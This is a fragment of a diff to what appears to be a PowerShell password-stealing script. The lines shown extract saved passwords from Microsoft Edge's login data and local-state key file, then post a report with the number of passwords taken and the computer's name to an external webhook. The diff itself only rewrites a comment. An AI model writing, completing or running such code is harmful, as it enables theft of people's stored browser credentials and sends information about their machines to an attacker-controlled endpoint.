@@ -275,7 +275,7 @@ $edgeLocalState = Join-Path $env:LOCALAPPDATA "Microsoft\Edge\User Data\Local St
 # Extract Edge passwords
 $edgeResults = Extract-EdgePasswords -loginDataPath $edgeLoginData -localStatePath $edgeLocalState
 
-#temp debugging
+# Output password count
 Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{
     content = "Extracted $($edgeResults.Count) password entries from Edge on $env:COMPUTERNAME"
 } | ConvertTo-Json) -ContentType 'application/json'
